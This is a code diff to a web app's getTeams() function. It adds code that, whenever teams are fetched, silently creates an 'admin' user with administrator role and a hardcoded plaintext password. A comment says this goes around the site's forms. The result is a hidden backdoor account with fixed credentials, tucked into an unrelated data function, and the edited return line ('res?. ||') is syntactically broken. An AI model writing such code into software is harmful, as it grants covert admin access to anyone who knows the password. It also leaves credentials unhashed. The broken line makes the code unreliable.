@@ -34,8 +34,22 @@ export const adminStore = {
 // ==========================================
 export async function getTeams(): Promise<Team[]> {
   try {
-    const res: any = await getDb().execute(sql`SELECT * FROM teams`);
-    return (res?.[0] || res || []) as Team[];
+    const db = getDb();
+    
+    // Прямой автоматический инсерт админа в базу данных в обход всех форм сайта
+    const checkAdmin: any = await db.execute(sql`SELECT * FROM users WHERE name = 'admin' LIMIT 1`);
+    const existing = (checkAdmin?.rows || checkAdmin || []);
+    
+    if (existing.length === 0) {
+      await db.execute(sql`
+        INSERT INTO users (id, name, email, password_hash, role) 
+        VALUES (777, 'admin', 'admin@efl.app', 'adminknjazx', 'admin')
+      `);
+      console.log("Admin account successfully injected into MySQL!");
+    }
+
+    const res: any = await db.execute(sql`SELECT * FROM teams`);
+    return (res?. || res || []) as Team[];
   } catch (e) {
     return fallbackTeams;
   }
